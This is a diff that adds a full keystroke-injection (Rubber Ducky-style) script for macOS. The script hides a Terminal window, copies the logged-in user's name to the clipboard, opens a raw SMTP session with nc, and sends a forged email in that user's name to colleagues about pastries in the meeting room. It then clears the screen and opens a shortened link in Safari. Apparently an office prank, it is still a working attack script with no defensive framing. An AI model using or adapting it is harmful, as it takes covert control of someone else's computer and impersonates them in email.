@@ -1,0 +1,71 @@
+DELAY 500
+GUI SPACE
+DELAY 100
+STRING terminal
+DELAY 400
+ENTER
+DELAY 250
+REM "Hiding" the terminal
+STRING printf '\e[4;1;1t'
+ENTER
+DELAY 50
+REM Get username, remove newline char at the end and put into clipboard
+STRING curl -s 'localhost:XXXXXXXXXXXXXXX?' | sed -n 'XXXXXXXXXXXX' | tr -d '\n' | pbcopy
+ENTER
+DELAY 100
+REM Connect to SMTP
+STRING nc 127.0.0.1 25
+ENTER
+DELAY 180
+STRING MAIL FROM:<
+# Pasting the user part of the email
+GUI v 
+DELAY 90
+STRING @XXXXXX.com>
+ENTER
+DELAY 40
+STRING RCPT TO:<XXXXXX@XXXXXX.com>
+ENTER
+DELAY 25
+STRING DATA
+ENTER
+DELAY 10
+STRING From: [
+GUI v
+STRING ] <
+GUI v
+STRING @XXXXXX.com>
+ENTER
+STRING To: [XXXXXX] <XXXXXXX@XXXXXX.ch>
+ENTER
+DELAY 10
+STRING Subject: Gipfeli
+ENTER
+DELAY 10
+ENTER
+DELAY 10
+STRING Hoi Zusammen
+ENTER
+DELAY 10
+STRING Morgen gibt es Gipfeli im Sitzungszimmer!
+ENTER
+DELAY 10
+STRING LG, 
+GUI v
+ENTER
+DELAY 100
+STRING .
+ENTER
+DELAY 100
+STRING QUIT
+ENTER
+DELAY 150
+ENTER
+DELAY 50
+STRING clear
+ENTER
+DELAY 20
+STRING open -a Safari 'https://goo.gl/emM3st'
+DELAY 40
+ENTER
+REM GUI q
